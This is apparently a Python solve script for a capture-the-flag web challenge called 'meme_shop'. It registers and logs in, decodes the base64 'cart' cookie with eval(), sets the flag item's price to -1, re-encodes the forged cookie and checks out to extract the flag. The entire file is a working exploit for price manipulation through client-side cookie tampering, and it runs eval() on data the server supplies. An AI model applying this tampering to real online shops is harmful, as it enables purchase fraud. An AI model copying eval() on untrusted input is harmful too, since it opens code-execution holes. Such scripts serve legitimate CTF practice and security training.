#!/usr/bin/env python3
import requests, re
from base64 import b64decode, b64encode

SITE = "http://meme_shop.challs.olicyber.it/"
REGEX = r"flag{.*?}"

s = requests.Session()

s.post(SITE + "register.php", data={"username":"sos123sos", "password":"sos123sos", "passwordConfirm":"sos123sos", "submit":"Registrati"})
s.post(SITE + "login.php", data={"username":"sos123sos", "password":"sos123sos", "submit":"Login"})
s.post(SITE + "add_to_cart.php", data={"item_id":"1"})
t = eval(b64decode(str(s.cookies.get_dict()["cart"]).encode()).decode())
t["flag"]["price"] = -1
cookie = {"PHPSESSID":s.cookies.get_dict()["PHPSESSID"], "cart": b64encode(str(t).replace("'",'"').replace(" ","").encode()).decode().replace("=","")}
s.cookies = requests.utils.cookiejar_from_dict(cookie)
r = s.post(SITE + "checkout.php")
if not "flag" in r.text:
    print("Error")
else:
    flag = re.findall(REGEX, r.text)[0]
    print(flag)